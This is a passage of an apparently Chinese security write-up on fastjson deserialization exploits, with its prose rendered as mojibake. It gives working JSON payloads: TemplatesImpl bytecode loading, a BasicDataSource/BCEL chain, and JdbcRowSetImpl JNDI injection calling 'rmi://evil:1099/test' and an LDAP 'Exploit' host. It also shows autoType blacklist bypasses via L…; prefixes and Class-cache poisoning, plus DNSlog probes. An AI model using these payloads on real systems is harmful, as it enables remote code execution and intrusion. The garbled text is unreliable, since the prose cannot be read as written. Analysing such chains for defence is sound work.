ç»è¿‡ä¸Šè¿°çš„ä¸¤ä¸ªæ¡ä»¶æå–åï¼Œä¿ç•™äº†ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterï¼Œå¹¶äºcom/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValueå‡½æ•°ä¸­invokeè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å®ç°äº†ç±»ä¼¼ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸»åŠ¨è°ƒç”¨readObjectå‡½æ•°çš„æ•ˆæœã€‚ çŸ¥é“äº†ä¸Šè¿°çš„æ¡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¼ å…¥æŸå­—æ®µçš„æ–¹å¼æ¥ä¸»åŠ¨è°ƒç”¨ç›¸å…³ç¬¦åˆæ¡ä»¶çš„setterå’Œgetterã€‚ä¾‹å¦‚åœ¨Personé‡Œé¢æ·»åŠ ä¸€ä¸ªsetTestå‡½æ•°ï¼Œå¹¶åœ¨éœ€è¦è½¬åŒ–çš„jsonä¸­æ·»åŠ &quot;test&quot;:1ï¼Œå°†ä¼šä¸»åŠ¨è°ƒç”¨setTestã€‚ æˆ‘ä»¬åœ¨åˆ©ç”¨@typeæ„é€ æœ‰å±å®³çš„åˆ©ç”¨é“¾æ—¶ï¼Œä¸»è¦å°±æ˜¯æŸ¥æ‰¾æœ‰å±å®³çš„æ— å‚æ•°çš„æ„é€ å‡½æ•°ã€ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterã€‚ 3. çªç ´parseä¸èƒ½è°ƒç”¨æ‰€æœ‰gettersçš„é™åˆ¶è¿™é‡Œçš„çªç ´æ€è·¯ä¸»è¦æœ‰ä¸¤ä¸ªï¼š tomcat bcelçš„poc threedreamå¸ˆå‚…å‘ç°çš„å¼•ç”¨çš„æ–¹å¼ ç¬¬ä¸€ç§ï¼šTomcat BCEL POCæ€è·¯è¿™ä¸ªpocå·§å¦™çš„åˆ©ç”¨äº†JSONObject.toStringå‡½æ•°ï¼Œå…ˆæ¥çœ‹çœ‹è¿™ä¸ªtoString è¿™ä¸ªtoStringç»§æ‰¿è‡ªJSON è¿™é‡Œä»–ç›´æ¥è°ƒç”¨äº†toJSONStringå‡½æ•° çœ‹åˆ°åç»­ä»–å°†å½“å‰è¿™ä¸ªJSONObjectå®ä¾‹è¿›è¡Œäº†obj to strçš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨é™æ€å‡½æ•°JSON.toJSONStringæ¥åºåˆ—åŒ–æ•°æ®ä¸€æ ·ï¼Œè¿™é‡Œå°†ä¼šè°ƒç”¨å½“å‰è¿™ä¸ªç±»çš„æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„gettersï¼ˆè¿™é‡Œçš„æ¡ä»¶æ¯”è°ƒç”¨parseæ—¶å®½æ¾ï¼Œä»–å¯¹è¿”å›ç±»å‹æ— é™åˆ¶ï¼‰ã€‚ é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œæ‰¾åˆ°ä¸€å¤„å¯ä»¥ä½¿ç”¨JSONObjectè°ƒç”¨toStringçš„åœ°æ–¹å°±å¯ä»¥äº† com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject è¿™é‡Œæœ‰ä¸€å¤„å¦‚æœå½“å‰objectä¸ºJSONObjectç±»å‹æ—¶ï¼Œå°†ä¼šå¯¹å½“å‰çš„è¿™ä¸ªkeyè°ƒç”¨toStringå‡½æ•°ã€‚è¿™é‡Œåœ¨å¤„ç†è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚æœé‡åˆ°{ï¼Œfastjsonä¼šåŠ ä¸€å±‚JSONObjectã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªç±»ä¼¼ 1&#123;&#123;some&#125;:x&#125; è¿™ç§æ–¹å¼ï¼Œæ­¤æ—¶çš„keyä¸º{}(ä¹Ÿå°±æ˜¯ä¸‹ä¸€å±‚çš„JSONObject)ï¼Œvalueä¸ºxã€‚æˆ‘ä»¬å°±å¯ä»¥ä½¿å¾—fastjsonå»è°ƒç”¨key.toStringå‡½æ•°ï¼Œè¿™ä¸ªtoStringçš„è¿‡ç¨‹ä¹Ÿå°±æ˜¯å°†keyè°ƒç”¨toJSONStringçš„è¿‡ç¨‹ï¼Œæ„å‘³ç€å°†ä¼šè°ƒç”¨å½“å‰keyå¯¹è±¡çš„æ‰€æœ‰gettersã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ä½¿parseå‡½æ•°æ‹¥æœ‰ä¸parseObjectä¸€æ ·çš„æ‰§è¡Œæ•ˆæœï¼Œä»¥ä¸‹é¢çš„pocä¸ºä¾‹ã€‚ 123456789&#123;// ç¬¬ä¸€å±‚JSONObjectï¼Œä»–çš„keyä¸ºå¦å¤–ä¸€ä¸ªJSONObject &#123;// ä¸‹ä¸€å±‚JSONObjectï¼Œä»–çš„å†…å®¹å°†ä¼šè°ƒç”¨toJSONString \"x\":&#123;// å…·ä½“è§¦å‘ç‚¹ä¸ºgetConnection \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\", \"driverClassLoader\": &#123;\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;, \"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\" &#125; &#125;:\"x\"&#125;; ç¬¬äºŒç§ï¼š$refç‚¹å½“fastjsonç‰ˆæœ¬&gt;=1.2.36æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨$refçš„æ–¹å¼æ¥è°ƒç”¨ä»»æ„çš„getter ä»¥1.2.48ç‰ˆæœ¬ä¸ºä¾‹ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹é‡åˆ°$refæ˜¯æ€ä¹ˆå¤„ç†çš„ com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388 å½“é‡åˆ°å¼•ç”¨$refè¿™ç§æ–¹å¼ï¼Œä¼šå¢åŠ ä¸€ä¸ªresolveTaskï¼Œç•™åœ¨parseç»“æŸåè¿›è¡Œå¤„ç† com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask è°ƒç”¨JSONPath.evalï¼Œå…³äºJSONPathçš„ä»‹ç» è¿™é‡Œçš„evalå‡½æ•°æœ€ç»ˆä¼šå»è°ƒç”¨JSONPath.getPropertyValueå‡½æ•°ï¼ˆè¿™é‡Œå…¶å®æ˜¯å¯ä»¥æ ¹æ®æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹å»è°ƒç”¨ä¸åŒçš„Segementï¼Œæ¯”å¦‚è¿™é‡Œç”¨äº†$.valueçš„æ–¹å¼ä½¿ç”¨çš„æ˜¯PropertySegementï¼‰ åç»­å°±ä¸è¯¦ç»†åˆ†æäº†ï¼Œè¿™é‡Œå¦‚æœå­˜åœ¨ç›¸åº”çš„getterï¼Œå°±ä¼šå»invokeè¿™ä¸ªå‡½æ•°ï¼›å¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆå°±ä¼šç”¨åå°„æœºåˆ¶å»è·å–å±æ€§çš„å€¼ã€‚ è¿™é‡Œä¸¾ä¸ªä¾‹å­ 123456json = \"&#123;\" + \"\\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\" + \"\\\"driverClassLoader\\\": &#123;\\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"&#125;,\" + \"\\\"driverClassName\\\": \\\"$$BCEL$$$l$8b$I$A$...\\\",\" + \"\\\"connection\\\":&#123;\\\"$ref\\\": \\\"$.connection\\\"&#125;\"+ \"&#125;\"; ä¼šå»è°ƒç”¨getConnectionå‡½æ•°ï¼Œè¿™é‡Œä¹Ÿçªç ´äº†parseåˆ°parseObjectçš„æ•ˆæœ (4). privateå±æ€§è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯é»˜è®¤fastjonåœ¨è½¬åŒ–æ—¶ï¼Œå¦‚æœæ²¡æœ‰setterå‡½æ•°ï¼Œè€Œæ˜¯ä»¥åå°„æœºåˆ¶æ¥èµ‹å€¼çš„æƒ…å†µï¼Œä¼šå¿½ç•¥privateå±æ€§çš„è½¬åŒ–ã€‚æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨æ„é€ è¿‡ç¨‹ä¸­ï¼Œå¡«å……è¿›å»çš„å±æ€§æ˜¯privateçš„ä¸”æ²¡æœ‰setterï¼Œé‚£ä¹ˆåœ¨è½¬åŒ–è¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šè¢«å¡«å…¥è¿˜åŸåçš„å¯¹è±¡çš„ã€‚å¦‚æœéœ€è¦å¯¹privateå±æ€§è¿›è¡Œè½¬åŒ–ï¼Œé‚£ä¹ˆéœ€è¦è®¾ç½®Feature.SupportNonPublicField 0x02 EXPåˆ†æ ç›¸æ¯”äºJavaååºåˆ—åŒ–åˆ©ç”¨é“¾æ„é€ çš„å¤æ‚æ€§ï¼Œfastjsonåˆ©ç”¨é“¾ä¸»è¦æ˜¯å¯»æ‰¾å¯åˆ©ç”¨çš„getterã€setterç­‰ï¼Œå¸¸è§çš„å‡ ç§POCå¦‚ä¸‹æ–‡æ‰€ç¤ºï¼š (1). templatesimplå‚è€ƒï¼šhttp://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/ æ ¹æ®å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„æ„é€ å‡½æ•°ã€setteræˆ–getterå‡½æ•°ã€‚åœ¨åˆ†æCommons-Collectionsç³»ç»Ÿçš„åˆ©ç”¨é“¾æ—¶ï¼Œæåˆ°è¿‡templatesimplçš„æ‰§è¡Œæ–¹å¼ï¼Œé€šè¿‡è½½å…¥bytecodesçš„æ–¹å¼æ¥è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœ(å…·ä½“ä¸å†åˆ†æ)ã€‚ å…¶ä¸­è§¦å‘è½½å…¥çš„å‡½æ•°ä¸ºnewTransformerå‡½æ•°ï¼Œè€Œå¾ˆå·§çš„æ˜¯ï¼Œtemplatesimplå­˜åœ¨ä¸€ä¸ªgetterè°ƒç”¨äº†è¯¥å‡½æ•° é‚£ä¹ˆå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¡«å…¥outputPropertiesçš„æ–¹æ³•æ¥è§¦å‘getOutputPropertiesï¼ˆä»–æ°å·§æ— setterï¼Œè¿”å›å€¼ä¹Ÿç¬¦åˆæ¡ä»¶ï¼‰ã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬éœ€è¦å¡«å……çš„ç±»å±æ€§éƒ½æ˜¯privateç±»å‹ï¼Œè¦æƒ³æ‰§è¡Œè¯¥åˆ©ç”¨é“¾ï¼Œéœ€è¦åœ¨è°ƒç”¨parseObjectå‡½æ•°æ—¶å¡«å…¥Feature.SupportNonPublicFieldã€‚ä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œå°†è°ƒç”¨è®¡ç®—å™¨ 1234String jsonString = \"&#123;\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\",\" + \"\\\"_name\\\":\\\"goodjob\\\",\\\"_tfactory\\\":&#123;&#125;,\" + \"\\\"_bytecodes\\\":[\\\"yv66vgAAADQAOgoAA...\\\"],\" + \"\\\"_outputProperties\\\":null&#125;\"; è¿™é‡Œçš„bytecodeså¯ä»¥ç”¨ysoserialå·¥å…·æ¥ç”Ÿæˆã€‚åœ¨æ„é€ payloadçš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯_tfactoryå¿…é¡»å¡«ä¸Šï¼Œå› ä¸ºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœå®ƒä¸ºnullï¼Œä¼šæŠ¥é”™æ— æ³•è¿›å…¥è½½å…¥bytecodesçš„æ­¥éª¤ã€‚éå¸¸å¥½çš„æ˜¯ï¼Œæˆ‘ä»¬åªè¦å¡«ä¸Š_tfactory:{}ï¼Œfastjsonä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬è°ƒç”¨TransformerFactoryImplï¼ˆtfactoryçš„ç±»ï¼‰çš„æ— å‚æ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ã€‚`\\`åœ¨smartMatchå‡½æ•°è¢«æ›¿æ¢ä¸ºç©ºã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œbyte[]ç±»å‹åœ¨fastjsonè½¬åŒ–ä¸­ä¼šè¢«base64ç¼–ç  æ‰€ä»¥payloadä¸­æ˜¯ä¸€é•¿ä¸²base64çš„å­—ä¸²ã€‚ å¯ä»¥çœ‹åˆ°è¿™ä¸ªpocå…¶å®é™åˆ¶è¿˜æ˜¯æŒºå¤§çš„ï¼Œéœ€è¦fastjson parseObjectæ—¶å¡«ä¸ŠFeature.SupportNonPublicFieldæ‰å¯ä»¥ã€‚ (2). åŸºäºJNDIçš„åˆ©ç”¨æˆ‘ä»¬éƒ½çŸ¥é“å¦‚æœJNDIçš„lookupå‡½æ•°å‚æ•°å€¼å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨JNDI Referenceçš„æ–¹æ³•åŠ è½½è¿œç¨‹ä»£ç è¾¾æˆRCEåˆ©ç”¨ã€‚æ‰€ä»¥æ ¹æ®å‰é¢çš„åˆ†æï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨æ— å‚æ„é€ å‡½æ•°ã€ç¬¦åˆæ¡ä»¶çš„setterã€ç¬¦åˆæ¡ä»¶çš„getteré‡Œå‘ç°ä¸€ä¸ªå¯æ§çš„lookupå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨JNDIçš„æ³¨å…¥æ–¹æ³•æ¥è¾¾æˆåˆ©ç”¨ã€‚ JdbcRowSetImplJdbcRowSetImplå¯¹è±¡å¯ä»¥è¢«æˆ‘ä»¬ç”¨åšä¸Šè¿°çš„åˆ©ç”¨ï¼Œæ¥çœ‹ä¸€ä¸‹ä»–çš„ä»£ç  è¿™æ¬¡å‡ºé—®é¢˜çš„åœ°æ–¹åœ¨äºsetAutoCommitå‡½æ•°ï¼Œè¯¥å‡½æ•°è°ƒç”¨äº†connectå‡½æ•°æ¥é‡æ–°å‘èµ·ä¸€ä¸ªjdbcçš„è¿æ¥ åœ¨connectå‡½æ•°é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†lookupå‡½æ•°ï¼Œå…¶å‚æ•°å€¼ç”±getDataSourceNameæ¥è·å–ï¼Œè¯¥å‡½æ•°ä¸»è¦è¿”å›å±æ€§dataSourceï¼Œæ ¹æ®fastjsonçš„åˆ©ç”¨åŸç†ï¼Œæˆ‘ä»¬åªéœ€è¦å¡«å……dataSourceå’ŒautoCommitå°±å¯ä»¥è§¦å‘è¿™é‡Œçš„JNDIæ³¨å…¥ã€‚ 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil:1099/test\",\"autoCommit\":true&#125; è¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„å¯ä»¥ç”¨æ¥JNDIæ³¨å…¥çš„å¯¹è±¡ï¼Œæ¯”å¦‚org.hibernate.jmx.StatisticsServiceçš„setSessionFactoryJNDINameå‡½æ•°ï¼ŒåŸç†ä¸€æ ·ä¸å†å™è¿°ã€‚ (3). Tomcat dbcp BasicDataSourceåŒ1ä¸­çš„TemplateImplï¼ŒBasicDataSourceä¹Ÿå¯ä»¥è½½å…¥ä»»æ„çš„å¯¹è±¡æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…ˆæ¥è®²ä¸€ä¸‹ä»–çš„åŸç† å‰é¢çš„åŸºç¡€çŸ¥è¯†é‡Œæåˆ°äº†æˆ‘ä»¬å¯ä»¥è°ƒç”¨ç¬¦åˆæ¡ä»¶çš„gettersï¼Œåœ¨BasicDataSourceå­˜åœ¨ä¸€ä¸ªgetConnectionå‡½æ•°ï¼Œä»–ä¸»è¦è°ƒç”¨createConnectionFactory åœ¨createConnectionFactoryå‡½æ•°ä½¿ç”¨Class.forNameåŠ è½½ç±» è¿™éƒ¨åˆ†driverClassNameå’ŒdriverClassLoaderæ˜¯å¯æ§çš„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è¦ç”¨åˆ°çš„æ˜¯com.sun.org.apache.bcel.internal.util.ClassLoaderï¼Œè¿™ä¸ªClassLoaderå¯ä»¥ä»classnameä¸­æå–å‡ºBCELæ ¼å¼çš„classå­—èŠ‚ç ï¼Œå¹¶è°ƒç”¨defineClassè¿›è¡Œè½½å…¥ è¿™é‡Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªç”¨äº†é™æ€å—çš„ç±»æ¥æ‰§è¡Œä»£ç ã€‚ 0x03 Fastjsonå†å²ç‰ˆæœ¬ä¿®å¤æªæ–½ è¿™ä¸€éƒ¨åˆ†ä¸»è¦è®²è¿°å‡ ä¸ªé‡è¦ç‰ˆæœ¬çš„å®‰å…¨æ›´æ–° (1). fastjson == 1.2.25é»˜è®¤å…³é—­AutoTypeï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯@typeçš„æ”¯æŒï¼Œè§enable_autotype com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) å½“é‡åˆ°@typeæ—¶ï¼Œä¼šå…ˆcom.alibaba.fastjson.parser.ParserConfig#checkAutoTypeã€‚è¯¥å‡½æ•°çš„ä¸€ä¸ªä¸»è¦é€»è¾‘ï¼ˆ1.2.25ç‰ˆæœ¬ï¼‰ å¼€å¯äº†AutoTypeæ—¶ï¼Œä¼šè¿‡ä¸€æ¬¡é»‘åå•å’Œç™½åå•æ£€æµ‹ï¼ˆå…ˆæ£€æµ‹ç™½åå•ï¼Œåæ£€æµ‹é»‘åå•ï¼‰ã€‚ ä¼˜å…ˆè½½å…¥äººå·¥é…ç½®çš„ç™½åå•ç±»ï¼Œå¹¶å¯¹é»‘åå•ç±»çˆ†å‡ºå¼‚å¸¸ï¼› è¿™é‡Œå…ˆå¿½ç•¥æœªå¼€å¯AutoTypeæ—¶çš„æ£€æµ‹å¤„ç† å‰é¢çš„æƒ…å†µéƒ½ä¸ç¬¦åˆï¼Œå¹¶ä¸”å¼€å¯äº†AutoTypeï¼Œåˆ™å°è¯•å»è½½å…¥ä»»æ„ç±»ï¼Œä½†æ˜¯ä¸å¯ä»¥è½½å…¥ClassLoaderå’ŒDataSourceçš„å­ç±» è¿™é‡Œè½½å…¥çš„æ–¹æ³•ç”¨çš„éƒ½æ˜¯TypeUtils.loadClassï¼Œæ¥çœ‹ä¸€ä¸‹ä»–çš„ä¸€ä¸ªå¤„ç† é¦–å…ˆä»–å¯¹äºLxxx.class.xxx;çš„ç±»è¡¨ç¤ºæ–¹æ³•åšL,;çš„å‰”é™¤ï¼Œé€’å½’è°ƒç”¨loadClasså»è°ƒç”¨å†…éƒ¨çš„å…·ä½“ç±» åç»­çš„è°ƒç”¨æ–¹æ³•ä¸ºä½¿ç”¨AppClassLoader.loadClassæˆ–Class.forNameå»åŠ è½½ç±» å¼€å¯AutoTypeçš„æƒ…å†µä¸‹ç»•è¿‡é»‘åå•æ£€æµ‹æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œå¦‚æœå¼€å¯äº†AutoTypeï¼Œé‚£ä¹ˆå¦‚æœæ˜¯åœ¨ç™½åå•é‡Œçš„ç±»ï¼Œç›´æ¥åŠ è½½ï¼Œå¯¹äºåœ¨é»‘åå•å†…çš„ç±»ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚ è€Œé»‘åå•çš„æ£€æµ‹æ–¹å¼æ˜¯å»åŒ¹é…å½“å‰çš„ç±»åclass.startsWith(deny) è€Œåœ¨è¿™ä¸ªé»‘åå•é‡Œæ˜¾ç„¶å¹¶æ²¡æœ‰è€ƒè™‘åˆ°TypeUtils.loadClasså®ç°ä¸­ï¼Œå¯¹äºLxxxx.class.xxx;çš„å¤„ç†ã€‚ é€šè¿‡Lxxxxx;çš„æ–¹å¼startsWithæ²¡åŠæ³•æ­£å¸¸åŒ¹é…å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»•è¿‡é»‘åå•çš„æ£€æµ‹ã€‚ (2). fastjson == 1.2.42åœ¨è¿™ä¸ªç‰ˆæœ¬ï¼Œå¯¹ä¸Šé¢çš„é»‘åå•æ£€æµ‹ç»•è¿‡åšäº†ä¿®å¤ï¼Œå¹¶ä¸”å°†é»‘åå•é‡Œçš„ç±»å‹è¿›è¡Œhashå¤„ç†ï¼Œå¢åŠ äº†åˆ†æéš¾åº¦ï¼› å¯¹äºå‰é¢Lxxxxx;çš„ç»•è¿‡ï¼Œ42ç‰ˆæœ¬æ·»åŠ äº†ä»¥ä¸‹ä»£ç æ¥å‰”é™¤ï¼ˆå› ä¸ºé»‘åå•å·²ç»å˜æˆäº†hashæ¯”è¾ƒçš„æ–¹å¼ï¼Œè¿™é‡ŒL;éƒ½ä»¥è¿™ç§æ–¹å¼æ¥ç¡®è®¤ï¼‰ ä½†æ˜¯è¿™é‡Œçš„å¤„ç†æ²»æ ‡ä¸æ²»æœ¬ï¼Œæˆ‘ä»¬ä½¿ç”¨LLxxxxx;;è¿™ç§æ–¹å¼å°±å¯ä»¥ç»•è¿‡ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºç°åœ¨çš„é»‘åå•å˜æˆäº†hashè®¡ç®—çš„æ–¹å¼ï¼Œç»™æˆ‘ä»¬åˆ†æå¢åŠ äº†ä¸å°‘éš¾åº¦ï¼Œä¸è¿‡æœ‰å¤§ä½¬å¯¹é»‘åå•hashåšäº†è¿˜åŸè§fastjson-blacklist (3). fastjson == 1.2.43è¿™ä¸ªç‰ˆæœ¬ä¸»è¦ä¿®å¤äº†ä¸Šé¢LLxxxx;;çš„æ–¹å¼ åšäº†ä¸¤æ¬¡æ£€æµ‹ï¼Œå¦‚æœç¢°ä¸ŠLLxxxxx;;çš„æ–¹å¼åˆ™ç›´æ¥çˆ†å‡ºå¼‚å¸¸ (4). fastjson == 1.2.48ä¿®å¤å‰çš„ç‰ˆæœ¬åœ¨48ç‰ˆæœ¬ä¹‹å‰ï¼ŒcheckAutoTypeè¿˜å­˜åœ¨è¿™æ ·ä¸€ä¸ªé€»è¾‘ï¼ˆä»¥1.2.47ä¸ºä¾‹ï¼‰ å½“å¼€å¯AutoTypeæ—¶ï¼Œå¦‚æœmappingsé‡Œé¢å­˜åœ¨è¿™ä¸ªç±»ï¼Œé‚£ä¹ˆå°±ç®—è¿™ä¸ªç±»åœ¨é»‘åå•é‡Œï¼Œä¹Ÿå…è®¸ä»–è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œ PSï¼šè¿™é‡Œçš„mappingsæ˜¯fastjsonææ—©è½½å…¥çš„ä¸€äº›ç¼“å­˜ç±» åç»­å¦‚æœèƒ½ä»mappingsé‡Œé¢å¾—åˆ°è¿™ä¸ªç±»ï¼Œå°±ç›´æ¥è¿”å›ã€‚é‚£ä¹ˆæˆ‘ä»¬æœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å°†æˆ‘ä»¬éœ€è¦çš„ç±»åŠ å…¥åˆ°è¿™ä¸ªmappingsé‡Œå‘¢ï¼Ÿ å…ˆæ¥çœ‹ä¸€ä¸‹deserializers.findClassï¼Œåœ¨deserializersé‡Œé¢é¢„å…ˆå¡«å……äº†ä¸€äº›ç±»ä¸å…¶ååºåˆ—åŒ–å™¨çš„å®ä¾‹ è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸€ä¸‹Class.classï¼Œä»–æ‰€å¯¹åº”çš„ååºåˆ—åŒ–å™¨ä¸ºMiscCodecï¼ŒcheckAutoTypeæ£€æµ‹è¿‡åï¼Œåç»­å°†è°ƒç”¨ååºåˆ—åŒ–å™¨çš„deserialzeå‡½æ•°ã€‚æ¥çœ‹çœ‹MiscCodecçš„è¿™ä¸ªå‡½æ•°å¯¹äºClass.classçš„å¤„ç† ä»–è°ƒç”¨äº†TypeUtils.loadClasså‡½æ•°ï¼Œå‰é¢æˆ‘ä»¬è®²è¿‡ï¼Œä»–å°†ä½¿ç”¨ClassLoader.loadClassæˆ–Class.forNameæ¥è½½å…¥ç±»ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠåˆ°äº†mappingsçš„æ“ä½œ è¿™é‡Œçš„cacheé»˜è®¤ä¸ºtrueï¼Œæ‰€ä»¥è¿™é‡Œä¼šç›´æ¥å°†è½½å…¥åçš„å¯¹è±¡å¡«å…¥mappings æ ¹æ®æˆ‘ä»¬å‰é¢çš„åˆ†æï¼Œå¦‚æœå½“å‰mappingsé‡Œå­˜åœ¨å¯æ§çš„ç±»ï¼Œé‚£ä¹ˆä¸ç®¡å¼€æ²¡å¼€å¯AutoTypeï¼Œéƒ½ä¼šè¿›è¡Œç±»è¿˜åŸï¼›åŒæ—¶æˆ‘ä»¬åˆ©ç”¨Class.classå¯ä»¥å‘mappingså¡«å……ä»»æ„ç±»ï¼Œè¿™å¯¼è‡´ç»•è¿‡äº†å‰é¢çš„æ£€æµ‹ï¼› 12345678// ä¸¾ä¸ªä¾‹å­json = \"&#123;\" + // ç”¨Classè½½å…¥com.sun.rowset.JdbcRowSetImplï¼Œå¹¶ç¼“å­˜åˆ°mappings \"&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,\" + // åç»­ä½¿ç”¨mappingsé‡Œçš„com.sun.rowset.JdbcRowSetImplæ¥è¿˜åŸå¯¹è±¡ \"&#123;\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\" + \"\\\"dataSourceName\\\": \\\"ldap://localhost:1389/Exploit\\\",\" + \"\\\"autoCommit\\\": true&#125;\" + \"&#125;\"; ä¿®å¤åçš„ç‰ˆæœ¬åœ¨1.2.48ç‰ˆæœ¬ä¸Šå¯¹å…¶è¿›è¡Œäº†ä¿®å¤ åœ¨MiscCodecå¯¹Classçš„å¤„ç†ä¸­ï¼Œä¿®æ”¹äº†cache=false å¹¶ä¸”å¯¹äºTypeUtils.loadClassé‡Œçš„mappingsæ“ä½œéƒ½ä¾èµ–äºcacheï¼Œå¦‚æœä¸ºfalseåˆ™ä¸æ·»åŠ åˆ°mappingsé‡Œï¼ˆåœ¨å‰é¢çš„ç‰ˆæœ¬é‡ŒClass.forNameéƒ¨åˆ†å¹¶ä¸ä¾èµ–cacheï¼Œ48ç‰ˆæœ¬ä¹‹åå¢åŠ äº†å¯¹cacheçš„åˆ¤æ–­ï¼‰ ä¸æ­¤åŒæ—¶ï¼Œjava.lang.Classä¹Ÿè¢«åŠ å…¥åˆ°äº†é»‘åå•é‡Œé¢ (5). åç»­ç‰ˆæœ¬åç»­ç‰ˆæœ¬çš„ç»•è¿‡ä¸»è¦å›´ç»•åœ¨ï¼š å¼€å¯AutoTypeï¼Œç»•è¿‡é»‘åå•æ£€æµ‹ åˆ©ç”¨deserializersé‡Œé¢çš„ç±»(è·ŸClass.classä¸€ä¸ªåŸç†) æœ€æ–°ç‰ˆ1.2.68å¼•å…¥äº†safeModeï¼Œåœ¨checkAutoTypeé‡Œæ·»åŠ äº†ä¸‹é¢åˆ¤æ–­ï¼Œå¦‚æœå¼€å¯äº†safemodeï¼Œé‚£ä¹ˆå°†ä¸å…è®¸è¿›è¡Œ@type ä¸è¿‡è¿™ä¸ªå¹¶ä¸æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œéœ€è¦äººå·¥å»é…ç½®ã€‚ (6). åç»­ç‰ˆæœ¬è§‰å¾—æœ‰æ„æ€çš„åˆ©ç”¨ fastjson &lt; 1.2.60 dos Fastjson-1-2-60-Dos ä½¿ç”¨dnslogæ¥æ£€æµ‹fastjsonæ¼æ´ https://github.com/alibaba/fastjson/issues/3077 è¿™é‡Œçš„åŸç†è·ŸClass.classæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ¢æˆäº†java.net.URLã€java.net.Inet4Addressã€java.net.Inet6Addressï¼Œç”±MiscCodecå¤„ç†æ—¶ä¼šå»è§¦å‘dnsæŸ¥è¯¢ å½“ç„¶è¿™é‡Œçš„è§¦å‘URLçš„è§¦å‘ç”¨çš„ysoserialé‡Œé¢çš„URLDNSçš„æ–¹å¼ï¼Œç”±hashcodeå»è§¦å‘ï¼› 123&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net&quot;&#125;:&quot;aaa&quot;&#125; 0x04 æ€»ç»“ 